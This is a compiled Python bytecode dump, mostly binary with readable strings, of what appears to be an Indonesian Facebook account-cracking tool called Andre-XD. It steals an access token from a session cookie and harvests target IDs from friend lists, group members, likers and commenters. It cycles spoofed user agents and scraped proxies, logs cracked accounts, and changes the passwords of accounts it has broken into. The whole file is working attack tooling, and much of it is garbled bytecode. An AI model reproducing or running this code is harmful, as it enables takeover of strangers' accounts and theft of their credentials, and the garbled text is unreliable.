o
    ,��b��  �                   @   sp  d dl Z zd dlZW n ey   ed� e �d� Y nw zd dlZW n ey5   ed� e �d� Y nw zd dlZW n eyN   ed� e �d� Y nw d dlZd dl Z d dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlmZ d d	lmZ d d
lmZ e�� ZejZg d�Zzed k s�edkr�e�  ed ZW n ey�   e�  Y nw e�� ZejZejZejZee Z dee ef Z!e!�"d� dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.dZ/dZ0dZ1dZ2dZ3e#e$e%e&e'e(e)e*gZ4e�5e4�Z6i i Z7Z8d\a9a:a;g g Z<Z=g Z>g a?g a:g Z@g ZAg ZBd aCdZDd ZEd!ZFd"ZGd#d$iZHd%d&d'd(d)d*d+d,d-d.d/d0d1�ZId2\ZJZKZLZMd3\ZNZOZPZQd4\ZRZSZTd5ZUd$ZVd6ZWd7ZXd8ZYd9ZZd:Z[d;Z\d<Z]e�5g d=��Z^d>Z_d?Z`d@Zae�5g dA��Zbg Zcg Zdze�edB�jfZgehdCdD��ieg� W n ej�y� Zk z
eek� W Y dZk[kndZk[kww eldE�D ]�ZmdFZne�oddG�Zpe�oddG�ZqdHZre�odIdJ�ZkdKZse�oddG�Zte�oddL�Zue�oddL�Zve�oddL�ZwdMZxen� ep� dNeq� dOer� ek� es� et� dNeu� dNev� dNew� dOex� �Zyec�zey� dPZ{e�5g dQ��ZpdRZqe�5g dS��Zre�oddT�Zke�5g dS��ZsdUZte�odVdI�ZudWZve�odXdY�Zwe�odZd[�Zxd\Z|e{� dOep� d]eq� er� ek� es� d^et� eu� dNev� dNew� dNex� dOe|� �Z}ed�ze}� �q�d_d`� Z~dadb� Zdcdd� Z�dedf� Z�dgdh� Z�diZBdjZ�dkdl� Z�dmdn� Z�dodp� Z�dqdr� Z�dsdt� Z�dudv� Z�dwdx� Z�dydz� Z�d{d|� Z�d}d~� Z�dd�� Z�d�d�� Z�d�d�� Z�d�d�� Z�G d�d�� d��Z�e�d�k�r�e��  dS dS )��    Nu+   
 [×] Modul requests belum terinstall!...
zpip install requestsu*   
 [×] Modul Futures belum terinstall!...
zpip install futuresu&   
 [×] Modul Bs4 belum terinstall!...
zpip install bs4)�ThreadPoolExecutor)�datetime)�BeautifulSoup)�Januari�Februari�Maret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember�   �   z%s %s %s�/z[1;97mz[1;92mz[1;93mz[1;957mz[0mz[1;90mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100m)r   r   r   zhttps://lookup-id.com/�https://mbasic.facebook.comzhttps://www.httpbin.org/ipzhttps://graph.facebook.com/{}�
user-agentzPMozilla/9.0 (Mobile; Nokia 9000 4G; rv:98.0) Gecko/98.0 Firefox/98.0 KAIOS/2.5.4r   r   r   r   r	   r
   r   r   r   r   r   r   )�01�02�03�04�05�06�07�08Z09�10�11�12)z
index.php?z*next=https%3A%2F%2Fdevelopers.facebook.comz%2Ftools%2Fdebugz%2Faccesstoken%2F)�loginzdevice-basedzvalidate-passwordz?shbl=0)Ztools�debugZaccesstoken�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7z�NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobilez�Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)��Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12a  Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911))��Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36�{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+��Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36r%   r'   z�Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]r(   )z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36r$   r&   z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36zwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz
.proxy.txt�wi'  z!Mozilla/5.0 (Symbian/3; Series60/�	   ZNokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9r   r   r    z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
���Q��?)�sys�stdout�write�flush�time�sleep)�z�e� r[   �Andre-XD.py�jalan�   s
   
�r]   c                   C   sT   t dtttf � t dtttttf � t dttttf � t dttttf � d S )NzE%s##################################################
 %sMETHOD MENU%sz* %s[%s1%s] Method 1 free (%sRecommended%s)z* [%s2%s] Method 2 mbasic (%sRecommended%s)z* [%s3%s] Method 3 mobile (%sRecommended%s))�printr@   �BMr:   r[   r[   r[   r\   �mentod�   s   r`   c                  C   sv   g d�} t d�D ],}t�d� tj�dt� dt� dt� dt� dt� d	�| |t| �   d
 � tj�	�  qt
d� d S )N)
u+   [[1;91m■[0m□□□□□□□□□]u+   [[1;92m■■[0m□□□□□□□□]u+   [[1;93m■■■[0m□□□□□□□]u+   [[1;94m■■■■[0m□□□□□□]u+   [[1;95m■■■■■[0m□□□□□]u+   [[1;96m■■■■■■[0m□□□□]u+   [[1;97m■■■■■■■[0m□□□]u+   [[1;98m■■■■■■■■[0m□□]u+   [[1;99m■■■■■■■■■[0m□]u,   [[1;910m■■■■■■■■■■[0m]�2   g�������?� �[�   •�] z
Loading...r.   z[0m � )�rangerW   rX   rS   rT   rU   r@   r:   �lenrV   r^   )Z	animation�ir[   r[   r\   �loading�   s   
@rj   c                   C   s�   t t� dt� dt� d�� t d� t dt� t� dt� dt� �� t dt� t� dt� dt� d	t� d
t� �� t dt� t� dt� dt� dt� dt� dt� dt� dt� d�� t dt� t� dt� dt� dt� dt� �� t d� d S )NuN  
 █████╗ ███╗   ██╗██████╗ ██████╗ ███████╗   ██╗  ██╗██████╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝   ╚██╗██╔╝██╔══██╗
███████║██╔██╗ ██║██║  ██║██████╔╝█████╗█████╗╚███╔╝ ██║  ██║
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██╔══╝╚════╝██╔██╗ ██║  ██║
██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗   ██╔╝ ██╗██████╔╝


uE    ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌r.   u8   ╔##################################################╗�   ║u   ╠═z, Author    : A N D R E - X D                z SC Status : Gratis rasa ZMemekz        z Network   : ZIM3z, zAXIS/XL�3z            z SC Version: V-6.0 (ZBETAz)               u8   ╚##################################################╝)r^   r?   r@   rB   r:   r=   r[   r[   r[   r\   �logo�   s   �
�*>*rm   c                 C   s  t | �dkst |�dk�r�tdtttttf � tdtttttt | ��tf � tdttttt |��tf � tt� dt� dt� dt� dt� d	t� d
t� d��}|dkrftdt� dt� d�� t| |� d S |dv �rKt	dt� dt� dt� d�� t
�d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� d��}|dv r�t�d� tdt� dt� dt� dt� dt� �
� tdt� dt� dt� dt� ��}t |�dkr�tdtttf � nt�|� |D ]J}|�d d�}|�d!�}tt� d"t� d#�� t	dt� dt� dt� d$t� |�d%d�� t� �
� zt|d �d%d�|d& � W q� tjj�y+   Y q�w td� t	d'tttttf � t	d(tttttf � t�  d S |d)v �rlt	dt� dt� dt� d*t� d+t� d,t� d-�� t�  d S tdt� dt� dt� d.�� t| |� d S t	d/tttf � t�  d S )0Nr   u�   
%s##################################################
 [%s✓%s] %sCRACK BY ROY META SC SELESAI...
%s##################################################z) %s[%s+%s] Number of Accounts OK : %s%s%sz' [%s+%s] Number of Accounts CP : %s%s%s�5##################################################
 [�?z] Show CP detector options [rK   r   �t�]: rf   �
 [�!�] Don't be empty�rK   �yr.   rc   z] Play airplanemode first�   �
 �] Change password when �TAP YES� [�rK   rv   Zyarv   rd   �] Password example : �admin123�] Enter new password : �*   
 %s[%s×%s] Password minimum 6 charactersrQ   �    • �4##################################################
 �LOGIN PROCESS�] Account : �	[ROY-CP] r   �-    %s[%s✓%s] %sChecking process is complete%s�/    %s[%s✓%s] Retrun SC type "%spython run.py%s"�rF   rp   re   zOk, thank you. Retrun SC type 'zpython run.py�'z] Choose Y/tz(

 %s[%s!%s] Sorry you didnt get results)rh   r^   r@   r:   �strr=   �inputr?   �hasilr]   rW   rX   r_   �ubahP�append�pwBaru�replace�split�	log_hasil�requests�
exceptions�ConnectionError�exit)�ok�cpZcek_cp�ww�pwBar�memek�kontol�titidr[   r[   r\   r�   �   sD    2$
&@
& 

0� 
8*r�   �metaZ	metaroyidc                  C   s�  z	t dd���  W n� ty�   t�d� t�  tdttt	tf � tdt
ttf � tdt	tf � tdt	tf � tdtttf �} | d	kr_td
t� dt� dt� d�� t�d� t�  nD| dv r�tdtt	tt	f � t�d� t�d� t�d� t�  n#| dv r�tdt � tdtttt	tf � ntt� dt� dt� d�� tdtttt	f �}t�  |dv r�tdtttf � t�d� t�  n'|tv r�tdtt	tf � t�d� t�  ntdtttf � t�d� t�  Y nw t�  d S )N�.ini_pw.txt�r�clearzS [%s!%s] Pilih nomer 2 jika ada yang memperjual
 belikan SC META. SC ini %sGRATIS%sz
 %s%sOPTION MENU%sz# [%s1%s] Already have SC Login Infoz% [%s2%s] Send a message to the Authorz
 %s[%s?%s] Choice : rf   r.   rc   �   ×�] Sorry, it is wrong...!r   ��2r   �@   
 %s[%s•%s] %sYou will be redirected to the Author Whatsapp...�{�G�z�?�Fxdg-open https://wa.me/601160610812?text=Hallo+izin+menggunakan+SC+ini�   ��1r   u�   %s══════════════════════════════════════════zO %s[%s!%s] You must have a %susername & password%s to
 continue with this tool!z
 %s[%s?%s] Enter Username : %s�rf   �  %s[%s!%s] Sorry don't be blank!u#    %s[%s✓%s] OK Username is correctz  %s[%s!%s] Sorry, wrong username)�open�read�FileNotFoundError�os�systemrm   r^   r?   r@   r:   r_   rB   r�   r=   r]   rW   rX   �cek_pwr�   rj   �user�kska�
moch_yayan)�pil�pwr[   r[   r\   r�   �   s:   
.$$"��
r�   c                  C   s�   t dttttf �} t�  | dv r$tdtttf � t�d� t	�  d S | t
v rCtdtttf � t�d� tdd��| � t�  d S td	tttf � t�d� t	�  d S )
Nz
 %s[%s?%s] Enter Password : %sr�   r�   r   u#    %s[%s✓%s] OK Password is correctr�   r�   �az  %s[%s!%s] Sorry, wrong Password)r�   r@   r=   r:   rj   r]   r?   rW   rX   r�   �pwasr�   rU   r�   )�xxr[   r[   r\   r�     s   &6&r�   c                  C   s�   t �d� zWtdd��� } tdd��� }t�| � z&tjdtd  d|id�}t�	|j
�d	 }t�	|j
�d
 }t||� W W d S  tyM   t�  Y W d S  tjjy\   t�  Y W d S w  tyi   t�  Y d S w )Nr�   �
.token.txtr�   �
.cokie.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookies�name�id)r�   r�   r�   r�   �tokenkur�   r�   �get�json�loads�textr�   �KeyError�yayanxdr�   r�   �IOError)�token�kukisZsyZsy2Zsy3r[   r[   r\   r!     s$   

��r!   c                  C   s�   t �d� t�  z<td�} tjddddddd	d
ddd�	d| id�}t�d|j�}t	dd��
|�d��}t	dd��
| �}td� t�  W d S  tyh } zt �d� t �d� td� t�  W Y d }~d S d }~ww )Nr�   z[|] Masukkan Cookies : z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comr�   r#   �	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	r   �refererZhost�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typer�   )�headersr�   z	(EAAG\w+)r�   r)   r   r�   z
 LOGIN SUCCESSFULLYzrm -f .token.txtzrm -f .cokie.txtZinvalid)r�   r�   rm   r�   r�   r�   �re�searchr�   r�   rU   �groupr^   r�   �	Exception)Z___kontol___�dataZ
find_tokenZkenZcokrZ   r[   r[   r\   r�   $  s"   
(

��r�   c                 C   s�  t �d� t�  t�t��� }|d }tdt� dt	� �� tt
� dt� dt
� dt� | � t	� �	� tt
� dt� dt
� dt� |� t	� �	� tt
� dt� dt
� d	|� �� tt
� dt� dt
� d
t� �� tdt	 � tt
� dt� dt
� dt� dt	� �	� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� dt� dt
� d�tt	f � t�d� tt
� dt� dt
� d�tt	tt	f � t�d� tt
� d�� tdt	tt	f �}tt
� d�� |dk�r~tdt	tt	f � t�d� t�  �nP|dv �r�ztdd��� }td d��� }W n t�y�   t�  Y nw tt
� d!t
� d"t
� �� tt
� d!t
� d#t
� ��}z/tjd$| d% td&  d'|id(��� d) d* D ]}|d+ }	t�|d, d- |d+  � �q�W �n� t�y�   td.� t�  Y �n�w |d/v �rtt� �n�|d0v �rtd1t	tt	f � tdt	� d2t� d3t	� d4t� ��}
|
d5v �r<td6t	tt	f � t�d� t�  �n�ztd ��� }d'|i}W n" t�yj   td7t� d8t	� d9�� t�d:� t �d;� t�  Y nw z�t�d<|
� d=t� ���� d+ }d>|v �r�td?|
� d@�t	tt	f � t�d� t�  n`dA|v �r�tdBt	tt	f � t�d� t�  nIdC|v �r�td?|
� d@�t	tt	f � t�d� t�  n.tdt	� d2t� dt	� dDt� |� �	� tdEt	� d2t� dFt	� dGt� dHt	� dI�� t dJ|
� �|� W �n� tj!j"tj!j#tj!j$f�y   tdK� Y �n�w |dLv �r�tdMt	tt	f � tdt	� d2t� d3t	� dNt� ��}
|
d5v �rEtd6t	tt	f � t�d� t�  ztd ��� }d'|i}W n% t�yv   tdEt	� d2t� d8t	� d9�� t�d:� t �d;� t�  Y nw ztdEt	� d2t� dFt	� dGt� dHt	� dI�� t%dO|
� �|� W �n7 t�y�   tdP|
� d@�� t�d� t�  Y �nw |dQv �rStdRt	tt	f � tdEt	� d2t� d3t	� dNt� ��}
|
d5v �r�td6t	tt	f � t�d� t�  ztd ��� }d'|i}W n% t�y   tdEt	� d2t� d8t	� d9�� t�d:� t �d;� t�  Y nw ztdEt	� d2t� dFt	� dGt� dHt	� dI�� t&dS|
� �|� W �n� t�yR   tdP|
� d@�� t�d� t�  Y �n|w |dTv �r]t'�  �nq|dUv �rt �(dV�}tdWt	tt	f � |D ]}tdXt	tt	|f � �qrtdYtt
t	tt	tf �}|dk�r�tdZtt
t	tt	tf �}td[| ��� �)� }d\| �*d]d�}|�*d^d��*d_d��*d`d��*dad��*dbd�}tdct	tt	t|t	tt	tt+|�t	f � tdt	 � t�d� |D ] }|�*ddd�}
|
�*dedf��*dgdh�}tdi|t	f � t�d� �q�tdjt	tt	f � tdktt	f � t�  �n�|dlv �rntdt	 � td�,g d�t� �t
� �dm�t	� �d7�t� �d�t	� �dn�t� �do�t	� �d2�t� �d�t	� �dp�t� �dq�t	� �d2�t� �d�t	� �dr�t� �ds�t	� �d2�t� �d�t	� �dt�t� �du�t	� �dv�t� �t
� �dw�t	� �d7�t� �dx�t	� �dy�t� �dz�t	� �d{�t� �d|�t	� �d}�t� �d~�t	� �d�t� �d��t	� �d7�t� �d��t	� �d��t� �d��t	� �d��t� �d��t	� �d��t� �d��t	� �d��t� �d��t	� ��� td�t	tt	tt	tt	f �}|dk�rtt	� d2t� d8t	� d��� n�|d�v �r>td�t	tt	tf � t�d�� t �d�� t�d� t�  n�|d�v �r`tdEt	� d2t� dt	� d��� td�t	tt	tt	f � t�  nntt	� d2t� d8t	� d��� n`|d�v �r�td� g d��}|D ]}t-j.�/d�t	tt	|f � t-j.�0�  t�d�� �q}t �d;� t �d�� td�t	tt	tf � td�t	tt	tt	f � t�  ntd�t	tt	t|t	f � t�d� t�  t1� �2t�S )�Nr�   r�   r.   z
LOGIN INFOu   ╠═ [rd   z] FB Name   : z] FB ID     : z] Your IP   : z] Join      : �4%s##################################################re   zOPTION MENUz"] [%s01%s] Public Friends (%sON%s)rR   z%] [%s02%s] Random ID Massal (%sOFF%s)z(] [%s03%s] Public Group Member (%sOFF%s)z] [%s04%s] Like Posts (%sOFF%s)z"] [%s05%s] Comment Posts (%sOFF%s)z(] [%s06%s] Checkpoint Detedtor (%sOFF%s)z(] [%s07%s] Check Crack Results (%sOFF%s)z] [%s08%s] SC update infoz+] [%s00%s] Logout (%sRemove Token/Cookie%s)rk   u   %s%s╠═[ %s Select menu : rf   u2   
 %s[%s×%s] Sorry the menu selection is wrong...!r�   r�   r�   r�   r�   u   ╠═[ zmasukan id zID : z https://graph.facebook.com/v1.0/�)?fields=friends.limit(5000)&access_token=r   r�   r�   �friendsr�   r�   r�   �<=>ztidak puvlikr�   �rl   r   zK%s##################################################
 %sGROUP TARGET INFO%src   ro   z] Enter Group ID : )rf   r.   u   
 %s[%s×%s] Dont be empty...!rr   r�   z_] You login using a token, if you want to crack from a group member, please login cookies firstrw   zrm -rf .token.txtz%https://graph.facebook.com/group/?id=z&access_token=zHalaman Tidak Ditemukanu   
 %s[%s×%s] Group with ID z
 not foundz/Anda Tidak Dapat Menggunakan Fitur Ini SekaranguZ   
 %s[%s×%s] Facebook restricts every activity, account is spammed, please switch accountszKonten Tidak Ditemukanz] Group Name : rx   rs   z
] To stop zCTRL+cz on keyboardz5https://mbasic.facebook.com/browse/group/members/?id=z
 [!] Sorry no connection)�4r   zJ%s##################################################
 %sLIKE TARGET INFO%sz] Enter Post ID : zLhttps://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier=z
 [!] Post with ID )�5r   zM%s##################################################
 %sCOMMENT TARGET INFO%s�https://mbasic.facebook.com/)r/   r   )r0   r   �resultszJ%s##################################################
 %sFILE HASIL CRACK%sz %s[%s+%s] %sz,
 %s%sFILE DETAILS%s
 [%s?%s] File name : %sz+
 %s%sFILE DETAILS%s
 [%s?%s] File name :%sz
results/%sz%s�-�.txtZOKZCPZcp_detektorZ
invalid_oku8    %s[%s•%s] File date :%s%s
 %s[%s•%s] Total : %s%s%srQ   z	[ROY-OK] z[1;92m[ROY-OK] r�   z[1;93m[ROY-CP] z%s%su$   
 %s[%s✓%s] File check complete...z [%sPRESS ENTER%s] to continue)r1   r   zSC INFOz] Author SC : zR O Y
 z] Whatsapp : z+601160610812
 z] Github : zhttps://github.com/ROY-ID
 z] Status SC : Gratis rasa ZPremiumz

 z
SOURC CODEr�   z] YayanXD      [r�   z	] Romi
 [rl   z] RozhakXD     [r�   z] Siapa lagi?

 zFIX BUG�   ✓z�] Terjadinya Error saat memainkan mode pesawat saat proses crack sedang berjalan, kini sudah diperbaiki dan sudah bisa dimainkan mode pesawat saat proses crack sedang berjalan
 [z1] Sedikit perubahan warna text dan tampilan SC
 [z#] Perubahan user agent bawaan SC
 [z] Penambahan menampilkan zWeb & Aplikasi AKTIFz:
 %s[%s?%s] Send direct message to Author [%sY%s/%st%s] : r�   ru   r�   r�   r�   r�   z] Ok, thank you...r�   )rN   Z00)�[1;92m.   �[1;93m..  �[1;96m... r�   r�   r�   z$ %s[%s!%s] Deleting Token/Cookie %sr   zrm -rf .cokie.txtu3   
 %s[%s✓%s] %sSuccessfully delete Token/Cookie...u0   
 %s[%s✓%s] Retrun SC type "%spython run.py%s"u9   
 %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!)3r�   r�   rm   r�   r�   �url_ipr�   r^   r_   r@   rB   r:   �wakturW   rX   r?   r�   r=   r]   r!   r�   r�   r�   r�   r�   r�   r�   r�   �_ngocok_�tokenzr�   r�   �
crack_grupr�   r�   ZChunkedEncodingErrorZReadTimeout�	like_post�ngomen_post�gabut�listdir�
splitlinesr�   rh   �joinrS   rT   rU   rV   �	__crack__�plerr)Zmy_nameZmy_idZipmZIPZpepekr�   r�   r�   ZpiZnamar�   Zcookiz�kuehr�   �dirs�file�totalZnm_fileZhps_nmr�   r�   ZupdZtitik�xr[   r[   r\   r�   7  s.  
&&$0000000,0
&

�2��

 
&4�
,
$
,$(� �
 
":�(&�
 
":�(&�




,&
�� 



"(r�   c                 C   sB  zt dtttf � ttdttttf ��}W n   d}Y t dtttttf � t|�D ]q}|d7 }ztdtttt|ttf �}t|�}W n t	y]   t dt� dt
� dt� d	�� Y q-w z*t�d
|�d�� d| � ���� d }|d D ]}t�|d d |d  d � quW q- ttfy�   tdtt
tt
tf � Y q-w d S )NzE%s##################################################
 %sTARGET INFO%sz' %s[%s?%s] Enter the target amount : %sr   u0    %s[%s•%s] type %sme%s Crack from friends listz% %s[%s?%s] Enter ID/Uname %s%s%s : %sr.   rc   r�   z] Username or ID is not publicz https://graph.facebook.com/v2.0/�_kontol_r�   r�   r�   r�   r�   r�   rQ   u.    %s[%s×%s] Sorry %sFriends ID is not public%s)r^   r@   r_   �intr�   r=   r:   rg   �__convert__�AttributeErrorr?   r�   r�   r�   r�   r�   r�   r�   r]   )Z__ppk__Z
nanya_keunZmnhr�   Z_memek_Zzzzr�   r[   r[   r\   r�   �  s$   (.$ ���r�   c           	      C   s  z{t tj| |d�jd�}|jddd�}|�d�D ]E}|d �dd	�}t�d
t	|��d }zt
�t	|�� dt	|�� d�� W n   Y tj�dt� dt� dt� dt� tt
�� �	� tj��  qdt	|�v ry|jddd�d }d| }t| |� W d S W d S    Y d S )Nr�   �html.parserZdivZobjects_container�r�   �tabler�   Zmember_rf   z <img alt="(.*), profile picture"r   r�   rQ   rb   rc   rd   �] Process Dump ID : �Lihat Selengkapnyar�   ��string�hrefr   )r   r�   r�   Zcontent�find�find_allr�   r�   �findallr�   r�   r�   rS   rT   rU   r@   r:   rh   rV   r�   )	Z	url_groupr�   Zsop_dev�membersZdevZuser_Znama_�urlZurl_grupr[   r[   r\   r�     s   $8�r�   c                 C   s  z�t j| |d�j}d|v rtd� W d S t�d|�}|D ]J}d|d v r8t�t�d|d �d d |d	  � nt�t�d
|d �d d |d	  � tj	�
dt� dt� dt� dt� tt�� �	� tj	��  qd|v r�tdt|d�jddd��d� |� W d S W d S    Y d S )Nr�   zSemua 0z( [!] There are no responses to this postz2\<h3\ class\=".."\>\<a\ href\="(.*?)"\>(.*?)<\/a\>zprofile.php?r   zid=(.*)r�   r   z/(.*)rb   rc   rd   r  r  r   r   r�   r  r  )r�   r�   r�   r�   r�   r
  r�   r�   rS   rT   rU   r@   r:   rh   rV   r�   r   r  )�hencet�mmkr�   r�   Zsoftekr[   r[   r\   r�   \  s   (&8*�r�   c           
      C   sR  z�t j| |ddid�j�d�}t|d�}|�d�D ]m}|jddd	�D ]c}d
|�d�v rK|�d��d�d }|�d�d }|j}t�|d | d � n|�d��d�d }|�d�d }|j}t�|d | d � t	j
�dt� dt� dt� dt� tt�� �	� t	j
��  q"q|jddd	�D ]}	d|	jv r�td|	�d� |� q�W d S    Y d S )Nr   z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;])r�   r�   zutf-8r   �h3r�   T)r  zprofile.phpr  �=r   �&r   r�   rQ   ro   r   rb   rc   rd   r  u   Lihat komentar lainnyaâ€¦r�   )r�   r�   r�   �encoder   r	  r�   r�   r�   rS   rT   rU   r@   r:   rh   rV   r�   )
r  r�   r�   r�   r  Z_id_�xzZbb�xdZasur[   r[   r\   r�   �  s,   
8�0
��r�   c                 C   sl   d| v rd| iS t �d| �r2t�d| � d��j}zt �dt|��d }W d|iS    | }Y d|iS d|iS )N�mer�   z\w+r�   z?_rdrz\;rid\=(\d+)\&r   )r�   r
  r�   r�   r�   r�   )r  r�   r�   r[   r[   r\   r�      s   �r�   c            	      C   sd  t �d�} tdtttf � | D ]}tdtt|f � qtdttttf �}ztd|� �d��	� }W n t
yG   td� t�d� t�  Y nw tt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� ��}|dv r�t�d� tdt� dt� dt� dt� dt� �
� tdt� dt� dt� ��}t|�dkr�tdtttf � nt�|� tdtttttt|��tf � tdt � |D ]J}|�d d!�}|�d"�}tt� d#t� d$�� td%t� dt� dt� d&t� |�d'd!�� t� �
� zt|d( �d'd!�|d) � W q� tjj�y   Y q�w td!� td*tttttf � td+tttttf � t�  d S ),Nr�   zK%s##################################################
 %sFILE RESULT CRACK%sz [%s+%s] %sz
 %s[%s?%s] Enter file : %szresults/r�   z"
 [!] Sorry, the file doesnt existr�   rn   rs   zO] Play airplanemode first.
##################################################
 rc   ro   ry   rz   r{   rK   r   rp   rq   r|   rv   rx   rd   r}   r~   r   rw   r�   u!    %s[%s•%s] Total %s%s%s accountr�   rQ   rf   r�   r�   r�   r.   r�   r�   r   r   r�   r�   )r�   r�   r^   r@   r_   r:   r�   r=   r�   �	readlinesr�   rW   rX   r�   r?   r�   r�   rh   r�   r�   r�   r�   r]   r�   r�   r�   r�   r�   )	r�   r�   �filesZ	buka_bajur�   r�   r�   r�   r�   r[   r[   r\   r�   ,  sB   
�T
&
 
0� r�   c                 C   s�  t �� }d}|j�dddtd|d�� t|�d�jd�}|�d	d
di�}|d�D ]}t	�|�d�|�d�i� q(t	�| |d�� |j
d|�d� t	d�}t|jd�}dt�dt|j��v ritj�dtttf �f d|j�� v r�d|jv r�tdt� dt� dt� d�� d S d�dd� |j�� �� D ��}	tdd ��d!| � d"|� d#�� tdt� dt� d$t� d%t� d&t� �
� t�d'� t||	� d S d(|j�� v �r�t�dt|��}
|�d	d
di�}g d)�}|d�D ]}|�d�|v r�t�|�d�|�d�i� q�|j
t|�d� td�}t|jd�}d*}d+d� |� d,�D �}t!|�d*k�r�d-|
